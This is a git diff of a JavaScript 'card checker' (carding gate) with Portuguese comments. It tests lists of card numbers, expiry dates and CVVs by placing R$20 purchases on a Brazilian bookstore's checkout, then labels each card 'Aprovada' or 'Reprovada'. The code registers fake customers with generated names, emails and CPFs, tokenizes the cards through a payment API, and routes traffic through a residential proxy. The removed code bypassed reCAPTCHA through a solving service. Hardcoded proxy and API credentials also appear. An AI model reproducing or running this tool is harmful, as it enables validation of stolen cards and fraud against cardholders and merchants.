@@ -1,12 +1,11 @@
 import axios from 'axios';
-import fs from 'fs';
 import chalk from 'chalk';
 import { HttpsProxyAgent } from 'https-proxy-agent';
-import randomUseragent from 'random-useragent';
-import cheerio from 'cheerio';
 import { faker } from '@faker-js/faker'; // Biblioteca atualizada para gerar dados falsos
-import cpf from 'cpf';                  // Biblioteca para gerar CPFs válidos
+import cpf from 'cpf';
+import tough from 'tough-cookie';       // Biblioteca para gerar CPFs válidos
 
+const  cookieJar = new tough.CookieJar();
 // Função para gerar um nome completo aleatório
 function gerarNomeCompleto() {
     const primeiroNome = faker.person.firstName();
@@ -61,206 +60,331 @@ const proxyConfig = {
         password: '1witm204vszvwdv'
     }
 };
-const proxyAgent = new HttpsProxyAgent(`http://${proxyConfig.auth.username}:${proxyConfig.auth.password}@${proxyConfig.host}:${proxyConfig.port}`);
+//const proxyAgent = new HttpsProxyAgent(`http://${proxyConfig.auth.username}:${proxyConfig.auth.password}@${proxyConfig.host}:${proxyConfig.port}`);
+const proxyCredentials = '2BBmmf8kVHfpGMzO:H8h2PGjZJhxX2g7Q_country-br,us_streaming-1';
+const proxyHost = 'geo.iproyal.com';
+const proxyPort = 12321;
 
 
-async function solveCaptcha() {
-    // Define o payload para a requisição inicial
-    const payload = {
-        "clientKey": "733c7653b216ab6f1d9b0537fd56431f", // Usando a api_key passada como argumento
-        "task": {
-            "type": "NoCaptchaTaskProxyless",
-            "websiteURL": 'https://app.t2.com.br/courseOffers/131', // Usando a URL passada como argumento
-            "websiteKey": '6Lejd2QqAAAAANuG-z7MA6EgIw6aBHYWyUAgSAHb'  // Usando o site_key passado como argumento
-        }
-    };
+const proxyAgent = new HttpsProxyAgent(`http://${proxyCredentials}@${proxyHost}:${proxyPort}`);
 
-    try {
-        // Envia a requisição POST para o CapMonster
-        const response = await axios.post("https://api.capmonster.cloud/createTask", payload);
-        const responseData = response.data;
+// Exemplo de uso
 
-        //   console.log(responseData.data);
 
-        // Verifica se a requisição foi bem-sucedida
-        if (responseData.errorId === 0) {
-            const task_id = responseData.taskId;
-            const timeout = Date.now() + 240000; // 240 segundos (4 minutos)
 
-            // Loop para verificar o status da resolução do CAPTCHA
-            while (Date.now() < timeout) {
-                await new Promise(resolve => setTimeout(resolve, 5000)); // Aguarda 5 segundos
+function getCardType(cardNumber) {
+    // Remove espaços ou hífens no número do cartão, caso existam
+    const cleanCardNumber = cardNumber.replace(/[\s-]/g, '');
 
-                //   console.log(api_key)
-                const resultResponse = await axios.post("https://api.capmonster.cloud/getTaskResult", {
-                    clientKey: '733c7653b216ab6f1d9b0537fd56431f',
-                    taskId: task_id
-                });
-                const resultData = resultResponse.data;
-
-                // console.log(resultData);
-
-                // Verifica o status da resposta
-                if (resultData.status === "ready") {
-                    return resultData.solution.gRecaptchaResponse;
-                } else if (resultData.errorId !== 0) {
-                    console.error("Erro ao resolver o CAPTCHA:", resultData.errorDescription);
-                    return null;
-                }
-            }
-        } else {
-            console.error("Erro ao criar tarefa:", responseData.errorDescription);
-        }
-    } catch (error) {
-        console.error("Erro:", error.message || error);
+    // Verifica se é Visa (começa com 4 e tem 13 ou 16 dígitos)
+    if (/^4\d{12}(\d{3})?$/.test(cleanCardNumber)) {
+        return 'visa';
     }
 
-    return null;
+    // Verifica se é Mastercard (começa com 51-55 ou 22-27 e tem 16 dígitos)
+    if (/^5[1-5]\d{14}$/.test(cleanCardNumber) || /^2[2-7]\d{14}$/.test(cleanCardNumber)) {
+        return 'master';
+    }
+
+    // Se não é Visa nem Mastercard
+    return 'Unknown Card Type';
 }
 
 // Exemplo de uso
 
+
 // Função de compra
 async function makePurchase(numberGG, monthGG, yearGG, cvvGG) {
     const startTime = Date.now();  // Captura o tempo de início
-    const userAgent = randomUseragent.getRandom();
-    let resolverCaptchaToken = await solveCaptcha();
-    // console.log(resolverCaptchaToken)
+
     try {
 
-        //console.log(`Tempo de requisição: ${durationInSeconds.toFixed(2)} segundos`);
+        const cardType = getCardType(numberGG);
+        //   console.log(`O tipo de cartão é: ${cardType}`);
 
-        const response = await axios.get('https://app.t2.com.br/courseOffers/131', {
+
+        const addProduct = await axios.get('https://paulinas.badiu21.com.br/financ/ecommerce/shop/integration/index', {
+            params: {
+                'productcode': '300.0001.0001.0001.0001.0000.0000.55.001.034'
+            },
             headers: {
-                'Host': 'app.t2.com.br',
+                'Host': 'paulinas.badiu21.com.br',
+                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
                 'Upgrade-Insecure-Requests': '1',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Referer': 'https://t2.com.br/',
+                'Sec-Fetch-Site': 'cross-site',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-User': '?1',
+                'Sec-Fetch-Dest': 'document',
+                'Referer': 'https://universo.paulinas.com.br/',
                 'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
             },
-            httpsAgent: proxyAgent
-        });
-
-        const html = response.data;
-        const $ = cheerio.load(html);
-        const csrfToken = $('meta[name="csrf-token"]').attr('content');
-        //  console.log(csrfToken);
-
-        if (!csrfToken) {
-            return console.log('request off -1')
-        }
-
-        //  console.log(resolverCaptchaToken)
-
-        const purchaseResponse = await axios.post(
-            'https://cursos.t2.com.br/api/v1/payments',
-            {
-                'installment_count': 1,
-                'billing_type': 'CREDIT_CARD',
-                "recaptcha_token": resolverCaptchaToken,
-                'customer_data': {
-                    'cpf_cnpj': dadosGerados.cpf,
-                    'address_number': '34',
-                    'postal_code': '09890300',
-                    'street': 'Rua Doutor Cincinato Braga',
-                    'neighborhood': 'Planalto',
-                    'state_id': 1,
-                    'city_id': 80,
-                    'name': dadosGerados.nome,
-                    'email': dadosGerados.email,
-                    'phone': '91984155843',
-                    'phone_country_code_id': 31
-                },
-                'credit_card': {
-                    'number': numberGG,
-                    'holder_name': dadosGerados.nome,
-                    'cvv': cvvGG,
-                    'expiry_month': monthGG,
-                    'expiry_year': `20${yearGG}`
-                },
-                'course_offer_id': 12
+            maxRedirects: 0,
+            validateStatus: function (status) {
+                // Considera qualquer status entre 200 e 302 como válido (não erro)
+                return status >= 200 && status <= 302;
             },
-            {
-                headers: {
-                    'Host': 'cursos.t2.com.br',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'X-CSRF-Token': csrfToken,
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
-                    'Accept': 'application/json',
-                    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
-                    'Content-Type': 'application/json',
-                    'sec-ch-ua-mobile': '?0',
-                    'Origin': 'https://app.t2.com.br',
-                    'Referer': 'https://app.t2.com.br/',
-                    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
-                },
-                httpsAgent: proxyAgent
-            }
-        );
+            httpsAgent: proxyAgent,
+        });
+        let fatura = addProduct.headers['location'];
 
+        const setCookies = addProduct.headers['set-cookie'];
 
-        console.log(purchaseResponse.data)
-
-        if (purchaseResponse.data.data.status == 'paid') {
-            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 000|Pagamento Realizado R$20,00 💸 |[@loficenter] `));
+        if (setCookies) {
+            setCookies.forEach(cookie => {
+                //console.log(cookie);
+                cookieJar.setCookieSync(cookie, 'https://paulinas.badiu21.com.br'); // Armazenando os cookies
+            });
         }
+ 
+        // Verificando os cookies armazenados
+        const cookies = cookieJar.getCookiesSync('https://paulinas.badiu21.com.br');
 
+        const regex1 = /transactionid=(\d+)/;
+        const faturaUrl = fatura.match(regex1);
+
+        if (!faturaUrl[1]) {
+            return console.log('Sem fatura"');  // 99666
+        }
+       const response = await axios.post(
+           'https://paulinas.badiu21.com.br/system/service/process',
+           {
+               'transactionid': faturaUrl[1],
+               '_service': 'badiu.financ.ecommerce.checkout.linkcontroller',
+               '_function': 'finishShopping',
+               'cuponcode': ''
+           },
+           {
+               headers: {
+                   'Host': 'paulinas.badiu21.com.br',
+                   'sec-ch-ua-platform': '"Windows"',
+                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+                   'Accept': 'application/json, text/plain, */*',
+                   'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                   'Content-Type': 'application/json;charset=UTF-8',
+                   'sec-ch-ua-mobile': '?0',
+                   'Origin': 'https://paulinas.badiu21.com.br',
+                   'Sec-Fetch-Site': 'same-origin',
+                   'Sec-Fetch-Mode': 'cors',
+                   'Sec-Fetch-Dest': 'empty',
+                   'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+                   cookies
+               },
+               httpsAgent: proxyAgent,
+           }
+       );
+
+
+       const response1 = await axios.post(
+           'https://paulinas.badiu21.com.br/system/service/process',
+           {
+               'username': dadosGerados.email,
+               'password': '',
+               'name': '',
+               'addpassword': '',
+               'personalphonemobile': '',
+               'nationalitystatus': 'native',
+               'transactionid': faturaUrl[1],
+               '_service': 'badiu.local.paulinas.ecommerce.loginsingin.formcontroller',
+               '_function': 'checkUsername'
+           },
+           {
+               headers: {
+                   'Host': 'paulinas.badiu21.com.br',
+                   'sec-ch-ua-platform': '"Windows"',
+                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+                   'Accept': 'application/json, text/plain, */*',
+                   'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                   'Content-Type': 'application/json;charset=UTF-8',
+                   'sec-ch-ua-mobile': '?0',
+                   'Origin': 'https://paulinas.badiu21.com.br',
+                   'Sec-Fetch-Site': 'same-origin',
+                   'Sec-Fetch-Mode': 'cors',
+                   'Sec-Fetch-Dest': 'empty',
+                   'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+                   cookies
+               },
+               httpsAgent: proxyAgent,
+           }
+       );
+
+       //  console.log(response1.data);
+
+
+       const responseResgister = await axios.post(
+           'https://paulinas.badiu21.com.br/system/service/process',
+           {
+               'username': dadosGerados.email,
+               'password': '',
+               'name': dadosGerados.nome,
+               'addpassword': 'loppesofc1@',
+               'personalphonemobile': 'loppesofc1@',
+               'nationalitystatus': 'native',
+               'transactionid': faturaUrl[1],
+               '_service': 'badiu.local.paulinas.ecommerce.loginsingin.formcontroller',
+               '_function': 'execSingin'
+           },
+           {
+               headers: {
+                   'Host': 'paulinas.badiu21.com.br',
+                   'sec-ch-ua-platform': '"Windows"',
+                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+                   'Accept': 'application/json, text/plain, */*',
+                   'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                   'Content-Type': 'application/json;charset=UTF-8',
+                   'sec-ch-ua-mobile': '?0',
+                   'Origin': 'https://paulinas.badiu21.com.br',
+                   'Sec-Fetch-Site': 'same-origin',
+                   'Sec-Fetch-Mode': 'cors',
+                   'Sec-Fetch-Dest': 'empty',
+                   'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+                   cookies
+               },
+               httpsAgent: proxyAgent,
+           }
+       );
+
+       const paymentCard = await axios.post(
+           'https://paulinas.badiu21.com.br/system/service/process',
+           {
+               'transactionid': faturaUrl[1],
+               'paymethodcheckoutid': 1,
+               '_service': 'badiu.fgateway.iugu.checkoutcreditcard.formcontroller'
+           },
+           {
+               headers: {
+                   'Host': 'paulinas.badiu21.com.br',
+                   'sec-ch-ua-platform': '"Windows"',
+                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+                   'Accept': 'application/json, text/plain, */*',
+                   'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                   'Content-Type': 'application/json;charset=UTF-8',
+                   'sec-ch-ua-mobile': '?0',
+                   'Origin': 'https://paulinas.badiu21.com.br',
+                   'Sec-Fetch-Site': 'same-origin',
+                   'Sec-Fetch-Mode': 'cors',
+                   'Sec-Fetch-Dest': 'empty',
+                   'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+                   cookies
+               },
+               httpsAgent: proxyAgent,
+           }
+       );
+
+
+       const iuguCard = await axios.get(`https://api.iugu.com/v1/payment_token?method=credit_card&data[number]=${numberGG}&data[verification_value]=${cvvGG}&data[first_name]=ASDA&data[last_name]=AS+DAS&data[month]=${monthGG}&data[year]=20${yearGG}&data[brand]=visa&data[fingerprint]=6dd7e852-8509-d2e6-33c6-139885af3e7b&data[version]=2.1&account_id=2E9D640D80F54658B192EE3899BF9D58&callback=callback1729758128795`, {
+           headers: {
+               'Host': 'api.iugu.com',
+               'sec-ch-ua-platform': '"Windows"',
+               'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+               'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+               'sec-ch-ua-mobile': '?0',
+               'accept': '*/*',
+               'sec-fetch-site': 'cross-site',
+               'sec-fetch-mode': 'no-cors',
+               'sec-fetch-dest': 'script',
+               'referer': 'https://paulinas.badiu21.com.br/',
+               'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
+           }
+       });
+
+
+
+       let data1 = iuguCard.data;
+       // console.log(data1)
+       const regex = /"id":"([a-z0-9-]+)"/i;
+       const match = data1.match(regex);
+
+       if (!match) {
+           console.log(match[1]);  // ecd7e31f-56b0-4816-9341-f1353f3dd1f1
+       }
+
+
+       const payment = await axios.post(
+           'https://paulinas.badiu21.com.br/system/service/process',
+           {
+               'token': match[1],
+               '_service': 'badiu.system.core.functionality.form.service',
+               '_key': 'badiu.fgateway.iugu.checkoutcreditcard.add',
+               'transactionid': faturaUrl[1],
+               'paymethodcheckoutid': '1'
+           },
+           {
+               headers: {
+                   'Host': 'paulinas.badiu21.com.br',
+                   'sec-ch-ua-platform': '"Windows"',
+                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+                   'Accept': 'application/json, text/plain, */*',
+                   'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                   'Content-Type': 'application/json;charset=UTF-8',
+                   'sec-ch-ua-mobile': '?0',
+                   'Origin': 'https://paulinas.badiu21.com.br',
+                   'Sec-Fetch-Site': 'same-origin',
+                   'Sec-Fetch-Mode': 'cors',
+                   'Sec-Fetch-Dest': 'empty',
+                   'Referer': 'https://paulinas.badiu21.com.br/fgateway/iugu/checkout/creditcard/add?transactionid=99659&paymethodcheckoutid=1',
+                   'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+                   cookies
+               },
+               httpsAgent: proxyAgent,
+           }
+       );
+
+       // console.log(payment.data);
+       if (payment.data.status == 'accept') {
+           //  console.log(payment.data)
+           cookieJar.removeAllCookiesSync();
+           return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${payment.data.message.message} R$ 20,00 💸 |[@loficenter] `;
+       } else {
+           cookieJar.removeAllCookiesSync();
+           return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${payment.data.message.generalerror} - [@loficenter]`
+       }
     } catch (error) {
-         console.log(error)
-        if (!error.response) {
-            console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1011|Número do cartão inválido - [@loficenter]`))
-            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1011|Número do cartão inválido - [@loficenter]`
-        }
-        let responseError = error.response.data.errors[0];
-        //console.log(responseError)
+        console.log(error)
+        if (error.response.data[1]) {
+            cookieJar.removeAllCookiesSync();
 
-        if (responseError.includes('Código de segurança inválido')) {
-            return console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1045|${responseError} | [@loficenter] `));
-        }
-        else if (responseError.includes('Saldo insuficiente')) {
-            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${responseError} 💸| [@loficenter]`));
-            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${responseError} 💸| [@loficenter]`
-        } else if (responseError.includes('Transação não autorizada por violação de segurança')) {
-            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1022|Transação não autorizada por violação de segurança 💸| [@loficenter]`));
-            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1022|Transação não autorizada por violação de segurança 💸| [@loficenter]`
-        } else if (responseError.includes('aprovada')) {
-            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 0000|Transação aprovada1 💸| [@loficenter]`));
-            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 0000|Transação aprovada1 💸| [@loficenter]`
-        } else if (responseError.includes('Número do cartão inválido')) {
-            console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1011|Número do cartão inválido | [@loficenter]`));
-            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1011|Número do cartão inválido | [@loficenter]`
+            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - Transação negada - [@loficenter]`
         } else {
-            console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${responseError} - [@loficenter]`));
-            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${responseError} - [@loficenter]`
+            cookieJar.removeAllCookiesSync();
+
+            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - Transação negada - [@loficenter]`
         }
+        //let returnError = error.response.data.data
+        //console.log(returnError)
+        //if ( returnError.data.gateway_response_code == 'N7' || returnError.data.gateway_response_code == '51') {
+        //    return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnError.data.status}|${returnError.data.gateway_response_code} 💸 |[@loficenter] `));
+        //  } else { 
+        //   return console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${error.response.data.message} - [@loficenter]`))
+        //  }
     }
 }
 
-
 async function executeFlow(value) {
     try {
-
-        // const uniqueList = [...new Set(list)];
-
-        //   for (let value of uniqueList) {
-
         const [numberGG, monthGG, yearGG, cvvGG] = value.split('|');
         const yearSplited = yearGG.split('20')[1];
-        // console.log(numberGG,monthGG,yearSplited,cvvGG)
-
-        try {
+        
+        if (value.startsWith('466')) {
+            console.log('O cartão começa com 466');
+            // console.log(numberGG,monthGG,yearSplited,cvvGG)
+            //return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno -  GATEWAY OFFLINE - `
+    
             let respoonse = await makePurchase(numberGG, monthGG, yearSplited, cvvGG);
             return respoonse
-        } catch (purchaseError) {
-            console.error('Erro ao realizar a compra:', purchaseError.message);
-        }
-
-        //  }
+            
+          } else {
+            console.log('O cartão não começa com 466');
+             return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - GATE APENAS PARA AS 466 - [@loficenter]`
+          }
 
     } catch (error) {
-        console.error('Erro no fluxo principal:', error.message);
+        console.error('Erro no fluxo principal:', error);
     }
 }
 
 export default executeFlow
+
